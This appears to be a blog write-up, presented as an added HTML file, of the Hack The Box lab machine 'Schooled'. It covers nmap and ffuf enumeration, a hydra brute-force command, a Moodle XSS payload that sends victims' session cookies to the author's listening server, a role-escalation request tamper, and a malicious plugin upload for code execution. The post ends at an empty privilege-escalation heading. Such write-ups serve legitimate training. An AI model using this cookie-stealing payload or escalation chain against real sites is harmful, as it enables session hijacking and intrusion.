@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Schooled :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NMAP ┌──(kali㉿kali)-[~/Documents/hackthebox] └─$ cat nmap.txt # Nmap 7.91 scan initiated Mon Jun 28 13:39:38 2021 as: nmap -oN nmap.txt -vv 10.10.10.234 Nmap scan report for 10.10.10.234 Host is up, received syn-ack (0.024s latency). Scanned at 2021-06-28 13:39:38 EDT for 7s Not shown: 982 closed ports Reason: 982 conn-refused PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 1051/tcp filtered optima-vnet no-response 1141/tcp filtered mxomss no-response 1217/tcp filtered hpss-ndapi no-response 1500/tcp filtered vlsi-lm no-response 2010/tcp filtered search no-response 2126/tcp filtered pktcable-cops no-response 5910/tcp filtered cm no-response 6007/tcp filtered X11:7 no-response 6025/tcp filtered x11 no-response 7443/tcp filtered oracleas-https no-response 10621/tcp filtered unknown no-response 16080/tcp filtered osxwebadmin no-response 16992/tcp filtered amt-soap-http no-response 32779/tcp filtered sometimes-rpc21 no-response 32783/tcp filtered unknown no-response 58080/tcp filtered unknown no-response Enumeration Lets take a look at the website In the footer i found a domain." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/schooled/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Schooled :: Research blog">
+<meta property="og:description" content="Hack The Box machine" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/schooled/" />
+<meta property="og:site_name" content="Schooled" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/schooled/">Schooled</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Schooled" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox<span style="color:#f92672">]</span>
+└─$ cat nmap.txt                 
+<span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 28 13:39:38 2021 as: nmap -oN nmap.txt -vv 10.10.10.234</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.234
+Host is up, received syn-ack <span style="color:#f92672">(</span>0.024s latency<span style="color:#f92672">)</span>.
+Scanned at 2021-06-28 13:39:38 EDT <span style="color:#66d9ef">for</span> 7s
+Not shown: <span style="color:#ae81ff">982</span> closed ports
+Reason: <span style="color:#ae81ff">982</span> conn-refused
+PORT      STATE    SERVICE         REASON
+22/tcp    open     ssh             syn-ack
+80/tcp    open     http            syn-ack
+1051/tcp  filtered optima-vnet     no-response
+1141/tcp  filtered mxomss          no-response
+1217/tcp  filtered hpss-ndapi      no-response
+1500/tcp  filtered vlsi-lm         no-response
+2010/tcp  filtered search          no-response
+2126/tcp  filtered pktcable-cops   no-response
+5910/tcp  filtered cm              no-response
+6007/tcp  filtered X11:7           no-response
+6025/tcp  filtered x11             no-response
+7443/tcp  filtered oracleas-https  no-response
+10621/tcp filtered unknown         no-response
+16080/tcp filtered osxwebadmin     no-response
+16992/tcp filtered amt-soap-http   no-response
+32779/tcp filtered sometimes-rpc21 no-response
+32783/tcp filtered unknown         no-response
+58080/tcp filtered unknown         no-response
+
+</code></pre></div><h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Lets take a look at the website
+<img src="/images/website.png" alt="website"></p>
+<p>In the footer i found a domain. If i add this to my /etc/hosts file i wonder if i will hit a different webpage</p>
+<p><img src="/images/domain.png" alt="domain"></p>
+<p>I also found some potential usernames
+<img src="/images/usernames.png" alt="usernames"></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="mailto:admissions@schooled.htb">admissions@schooled.htb</a></td>
+<td></td>
+</tr>
+<tr>
+<td>James Fernando</td>
+<td></td>
+</tr>
+<tr>
+<td>Jacques Philips</td>
+<td></td>
+</tr>
+<tr>
+<td>Venanda Mercy</td>
+<td></td>
+</tr>
+<tr>
+<td>Jane Higgins</td>
+<td></td>
+</tr>
+<tr>
+<td>Lianne Carter</td>
+<td></td>
+</tr>
+<tr>
+<td>Manuel Phillips</td>
+<td></td>
+</tr>
+<tr>
+<td>Jamie Borham</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>After adding  the domain to my /etc/hosts folder it took me to the same website</p>
+<h2 id="larger-nmap-scan">Larger NMAP scan<a href="#larger-nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Nmap scan with all ports flag and service version enumeration shows the webpage is running php, and it is a freebsd OS.</p>
+<p>From this scan we can also see mysql is open. We can try crackmapexec with some of the names found on the wesbite here for some low hanging fruit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/schooled<span style="color:#f92672">]</span>                                                                  
+└─$ cat nmapAll.txt                                                                                                
+<span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 28 13:43:10 2021 as: nmap -sV -sC -A -p- -oN nmapAll.txt -vv 10.10.10.234       </span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.234                                                                                  
+Host is up, received syn-ack <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.                                                                     
+Scanned at 2021-06-28 13:43:10 EDT <span style="color:#66d9ef">for</span> 381s                                                                        
+Not shown: <span style="color:#ae81ff">65532</span> closed ports                                                                                      
+Reason: <span style="color:#ae81ff">65532</span> conn-refused                                                                                         
+PORT      STATE SERVICE REASON  VERSION                                                                            
+22/tcp    open  ssh     syn-ack OpenSSH 7.9 <span style="color:#f92672">(</span>FreeBSD 20200214; protocol 2.0<span style="color:#f92672">)</span>                                       
+| ssh-hostkey:                                                                                                     
+|   <span style="color:#ae81ff">2048</span> 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>                                                     
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY8PnQ2GFk9RrUQ82xGivlyXZ8k99JFZAFlNqJIftRHSGWL3HsfaO08lnGCrqVxj3235k0L74S
+JAqWfJs1ykTRipcZpsI5QvwYPyqpisMgH/SdCH1wehZpgaXRwdn52ob9+GxZ6qjqIon0cH0XR1hkNIGdbTt4RRMy+IfynzVuomW2mUi0tnnXU69pcyY
+NMShND4PqxVDKZHwUyeDIiYVBvnL5P9qEh0Q/t0HKWFHQ8otwWEpL3jnn774RFP9ETtZsJ/xosuhty02yIZuP6vqtbWfVqcqM8v1R3jm/xjXfXxiflG
+O09KO2aePAbEhNEofb7V/f33dRQDv5mr9ceZ1                                                                              
+|   <span style="color:#ae81ff">256</span> e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>                                                    
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHc4TgrG+CyKqaIsk10XmAhUKULXK6Bq3bHHeJiWu
+BmdGS1k3Fp60OoVFdDKQj9aihkaUmbJ8fkG6dp07bm8IcM<span style="color:#f92672">=</span>                                                                    
+|   <span style="color:#ae81ff">256</span> 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>                                                  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWIP8gV7SGQNoODfYq9qg1k3j6ZZg+1L9zIU9FrHPaf                                 
+80/tcp    open  http    syn-ack Apache httpd 2.4.46 <span style="color:#f92672">((</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.4.15<span style="color:#f92672">)</span>                                         
+|_http-favicon: Unknown favicon MD5: 460AF0375ECB7C08C3AE0B6E0B82D717
+| http-methods: 
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+33060/tcp open  mysqlx? syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">|     HY000
+</span><span style="color:#e6db74">|   LDAPBindReq: 
+</span><span style="color:#e6db74">|     *Parse error unserializing protobuf message&#34;</span>
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">|_    HY000
+</span><span style="color:#e6db74">
+</span></code></pre></div><p>It looks as though they may have moodle implemented based off some wording on the website, which could be useful information for later</p>
+<p><img src="/images/moodle.png" alt="moodle?"></p>
+<p>lets try some directory enumerationa and DNS enumeration since this webpage has nothing of real interest</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents<span style="color:#f92672">]</span>           
+└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.schoo
+</span><span style="color:#e6db74">led.htb&#34;</span> -fw <span style="color:#ae81ff">5338</span>                                   
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>                                                                           
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/                                                                            
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>                                                                          
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/                                                                           
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>                                                                           
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/                                                                            
+                        
+       v1.3.1 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>                                                                                    
+________________________________________________     
+ :: Method           : GET                                                                                         
+ :: URL              : http://schooled.htb                                                                         
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt                           
+ :: Header           : Host: FUZZ.schooled.htb                                                                     
+ :: Follow redirects : false                                                                                       
+ :: Calibration      : false                                                                                       
+ :: Timeout          : <span style="color:#ae81ff">10</span>                                                                                          
+ :: Threads          : <span style="color:#ae81ff">40</span>                                                                                          
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405                                            
+ :: Filter           : Response words: <span style="color:#ae81ff">5338</span>                                                                        
+________________________________________________     
+moodle                  <span style="color:#f92672">[</span>Status: 200, Size: 84, Words: 5, Lines: 2<span style="color:#f92672">]</span>                                                
+:: Progress: <span style="color:#f92672">[</span>4989/4989<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">91</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:48<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</code></pre></div><p>Interesting. Looks like we were right with finding moodle&hellip;</p>
+<p>Lets add to our hosts file and see what we can find.</p>
+<p>we have a webpage! Looks like we have some teachers names for the classes as well as a login page.</p>
+<p><img src="/images/moodle2.png" alt="moodle"></p>
+<p>I had to create an account to allow me to navigate the site and get access to things like teacher profiles and the dashboard etc.</p>
+<p>I noticed there is a &ldquo;last access to site&rdquo; timer under each profile, most were hundreds of days ago, and some had never visited the site except one teacher which visited it a few seconds ago.</p>
+<p><img src="/images/moodle3.png" alt="moodle3"></p>
+<p>From a quick google search i discovered there is an authenticated RCE with moodle 3.4.1 (<a href="https://www.exploit-db.com/exploits/46551)">https://www.exploit-db.com/exploits/46551)</a>. It requires a teacher role to be able to generate a create a new course, once a new course has been created the teacher role can create a quiz, from there we can inject a malicious question to the quiz (our reverse shell), when we then visit the site, this code is executed generating us a reverse shell.</p>
+<p>So from what i have found so far i probably need Manuel&rsquo;s creds and i can get code execution.</p>
+<p>To grab the creds i am going to attempt to bruteforce the login for Manuel Phillips. From their user account i can see their email adress which has their username which i can use to login.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/schooled<span style="color:#f92672">]</span>
+└─$ sudo hydra -l phillips_manuel -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt moodle.schooled.htb http-post-form <span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:Invalid login, please try again&#34;</span> -t <span style="color:#ae81ff">50</span> -v
+</code></pre></div><p>After an unsuccessful attempt at bruteforcing i decided to look into the messaging feature of the application. Since the account Manuel Phillips is visiting the site every couple of minutes i thought they might check the messages. Therefore if there is a vulnerability with this feature i could potentially steal the session cookie of the user, bypassing the authentication needed for the RCE to work.</p>
+<h2 id="xss-in-instant-messaging">XSS in Instant Messaging<a href="#xss-in-instant-messaging" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I always throw a quick <code>&lt;script&gt; alert(1) &lt;/script&gt;</code> when i see a user input box as you never know what might come of it. And in this case it paid off as i found its vulnerable to XSS.</p>
+<p><img src="/images/xssPOC.png" alt="xssPOC"></p>
+<p>Lets try and steal the session cookie!
+I set up a simple python http server to capture the cookie if the user hits the page, alongside this payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;img src<span style="color:#f92672">=</span>x onerror<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this.src=&#39;http://10.10.16.49:8000/?&#39;+document.cookie; this.removeAttribute(&#39;onerror&#39;);&#34;</span>&gt;
+</code></pre></div><p>What this payload does is grabs the user session cookie if they visit the page with the malicious code and sends it to my webserver, which can be seen below. However, currently all it is doing is grabbing my session cookie, i need to find a different place to put this payload that the user actually visits.</p>
+<p><img src="/images/stealSessionCookie.png" alt="stealSessionCookie"></p>
+<h2 id="moodlenet-profile">MoodleNet Profile<a href="#moodlenet-profile" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I found an announcement from Manuel Phillips on the maths class. It says Manuel will be checking the &ldquo;MoodleNet Profile&rdquo;. So perhaps this is where the payload needs to go since this is where it will hit the page.</p>
+<p><img src="/images/anouncement.png" alt="anouncement"></p>
+<p>The moodle set profile is a parameter we can set in our profile.</p>
+<p><img src="/images/newPayloadLocation.png" alt="newPayloadLocation"></p>
+<p>Ok, lets see if we can get a session cookie</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/schooled<span style="color:#f92672">]</span>
+└─$ sudo python3 -m http.server
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+10.10.10.234 - - <span style="color:#f92672">[</span>04/Jul/2021 12:15:36<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?MoodleSession=qnv5sp28115jjvle614uc4lqe2 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+
+</code></pre></div><p>It worked!</p>
+<p><img src="/images/loggiedIn.png" alt="loggedIn"></p>
+<h2 id="rce">RCE<a href="#rce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>From enumerating the version number i found this version of moodle has a feature called &ldquo;Log in as&rdquo; which can be abused to privilege escalate.</p>
+<p>It requires an account with a teach role which we now have. We need to be able to enrol students into a class, specifically an account with higher privilege like a manager account.</p>
+<p>The first step is to enrol a manager. Clicking the drop down list of user to enrol we can see Lianne Carter is a manager, if we enrol her and intercept this request we can change the permissions of our account to the permissions of Lianes account to become a manager. From there we can Sign in as Lianne who has full manager permissions and upload a malicious paylaod.</p>
+<p>Enrol user.</p>
+<p><img src="/images/enrolluser.png" alt="enrolluser"></p>
+<p>Intercept request</p>
+<p><img src="/images/burpEnrol.png" alt="burpEnrol">
+We changed the user list id to that of Manuel Philips and the role to assign to 1. This will give manuel phillips the same permissions as Lianne Carter (Manager role).</p>
+<p><img src="/images/burpResponse.png" alt="burpResponse"></p>
+<p>Now we can log in as Lianne as we have elevated privileges slightly. Once logged in as lianne we will have full manager permissions.</p>
+<p><img src="/images/loginAs.png" alt="LoginAsAdmin"></p>
+<p>Now we are signed in. At the bottom left we have a new tab. &ldquo;Site Administration&rdquo;. The CVE i found earlier also contained a remote code execution with this new privilege gained from abusing the sign in as feature. By uploading a malicious plugin we can get it executed on the server.</p>
+<p>Change permissions to allow upload of plugins
+<img src="/images/pluginPerms.png" alt="pluginPerms"></p>
+<p><img src="/images/upload.png" alt="uploadPlugin"></p>
+<p>A moodle plugin is just a zip file however, we need to include some other files, like a version.php. This tells moodle what type of plugin we will be uplaoding and its version. This is explained in the moodle documentation. here <a href="https://docs.moodle.org/dev/Plugin_files">https://docs.moodle.org/dev/Plugin_files</a></p>
+<p><img src="/images/pluginInfo.png" alt="pluginInfo"></p>
+<p>We need a version.php, and a /lang/en directories which is where our malicious code will sit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/schooled/rce<span style="color:#f92672">]</span>
+└─$ cat version.php                       
+&lt;?php 
+$plugin-&gt;version <span style="color:#f92672">=</span> 2020061700;
+$plugin-&gt;component <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;block_rce&#39;</span>;  
+</code></pre></div><p>RCE working!
+<img src="/images/rceWorking.png" alt="rce"></p>
+<p>I have got code execution, lets take a look around.</p>
+<p><img src="/images/credsinconfig.png" alt="credsinconfig"></p>
+<p>Inside the moodle directory i found a config file with a password (PlaybookMaster2020). I sprayed this passsword with all the users with shell access on the box, but i did not get access.</p>
+<p>Reviewing the NMAP from earlier mysqlx is open on port 33060! Lets try and see if we can get any creds for lateral movement or priv esc.</p>
+<h1 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
